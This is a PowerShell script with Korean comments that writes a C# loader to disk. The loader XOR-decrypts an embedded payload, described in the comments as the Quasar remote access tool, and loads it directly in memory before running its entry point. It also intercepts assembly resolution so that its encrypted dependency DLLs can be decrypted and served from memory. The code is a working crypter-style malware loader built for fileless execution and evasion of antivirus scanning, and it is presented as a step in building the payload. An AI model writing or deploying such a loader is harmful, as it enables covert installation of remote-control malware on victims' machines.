# 1. 작업 디렉터리로 이동
Set-Location -Path C:\BuildWork

# 2. Loader.cs 소스 코드 텍스트 작성 및 저장
$loaderSource = @"
using System;
using System.Reflection;
using System.IO;

namespace CustomLoader
{
    class Program
    {
        // Custom XOR 복호화에 사용할 동일한 비밀키 (1단계와 동일해야 함)
        static byte[] xorKey = new byte[] { 0x5A, 0x1F, 0x3C, 0x7E };

        // [1단계에서 추출된 암호화된 Quasar 바이너리 바이트 배열 예시]
        // 실제 작업 시 1단계에서 얻은 Encrypted_Quasar.txt 내용을 이곳에 대입합니다.
        static byte[] encryptedQuasar = new byte[] { 0x8A, 0x4F, 0x12, 0x34 }; 

        // [외부 DLL 종속성 바이트 배열 예시 (예: Costura.dll)]
        static byte[] encryptedDll = new byte[] { 0x7B, 0x2E, 0x55, 0x11 };

        static void Main(string[] args)
        {
            // ① .NET 런타임의 외부 DLL 탐색 실패 이벤트(AssemblyResolve)에 커스텀 핸들러 바인딩
            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CustomAssemblyResolver);

            // ② 메모리 상에서 Quasar 메인 바이너리 XOR 복호화
            byte[] decryptedQuasar = CustomXor(encryptedQuasar, xorKey);

            // ③ 메모리 상의 바이트 배열을 .NET 어셈블리로 직접 로드 (In-Memory Loading)
            Assembly quasarAssembly = Assembly.Load(decryptedQuasar);

            // ④ Quasar의 메인 진입점(EntryPoint/Main 함수)을 인자 없이 호출하여 실행
            MethodInfo entryPoint = quasarAssembly.EntryPoint;
            entryPoint.Invoke(null, null);
        }

        // [핵심 메커니즘] 외부 DLL 동적 로딩 실패 시 자동 호출되는 이벤트 핸들러
        static Assembly CustomAssemblyResolver(object sender, ResolveEventArgs args)
        {
            // 요청된 DLL 어셈블리 이름을 확인 (예: "Costura, Version=...")
            string requestedAssembly = args.Name;

            // 만약 요청된 DLL이 탐색 대상 외부 DLL이라면 메모리에서 복호화하여 반환
            if (requestedAssembly.Contains("Costura") || requestedAssembly.Contains("Newtonsoft"))
            {
                byte[] decryptedDll = CustomXor(encryptedDll, xorKey);
                return Assembly.Load(decryptedDll); // 복호화된 어셈블리를 .NET CLR에 리턴
            }

            return null; // 그 외의 어셈블리는 기본 탐색 수행
        }

        // Custom XOR 복호화 함수 (암/복호화 원리가 동일함)
        static byte[] CustomXor(byte[] input, byte[] key)
        {
            byte[] result = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                result[i] = (byte)(input[i] ^ key[i % key.Length]);
            }
            return result;
        }
    }
}
"@

# 3. 작성된 소스 코드를 Loader.cs 파일로 디스크에 저장
[System.IO.File]::WriteAllText("C:\BuildWork\Loader.cs", $loaderSource)
